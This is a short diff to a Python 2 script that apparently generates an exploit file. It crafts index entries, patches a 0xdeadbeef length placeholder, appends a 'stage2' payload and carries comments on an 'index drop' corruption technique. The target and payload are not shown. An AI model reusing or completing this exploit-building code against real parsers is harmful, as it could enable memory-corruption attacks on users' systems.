@@ -16,7 +16,8 @@ def write_index(f, idx):
     q = 1
     for i in xrange(count+1):
         ww(f, q)
-        if i != count: q += len(idx[i])
+        if i != count:
+            q += len(idx[i])
 
         # I think this is an 'up-and-coming' bug.
         #if i != count:
@@ -88,6 +89,9 @@ gvalue2 ='\0' * (4 - (len(gvalue) % 4))
 gvalue = gvalue.replace(struct.pack('>I', 0xdeadbeef), struct.pack('>I', len(gvalue) + len(gvalue2)))
 gvalue2 += stage2
 
+open('gvalue.txt', 'w').write(gvalue)
+open('gvalue2.txt', 'w').write(gvalue2)
+
 # TODO:
 # value1 value2 ... valueN
 # 123 (index so that it reaches back to value1)
@@ -95,4 +99,5 @@ gvalue2 += stage2
 # it will now be filled with 123
 # [index drop]* ... to copy
 # ind[random random or index index] * n
-write_index(f, [gvalue, gvalue2])
+write_index(f, ['\x0e\x0e\x0e\x0e', gvalue])
+f.write(gvalue2)
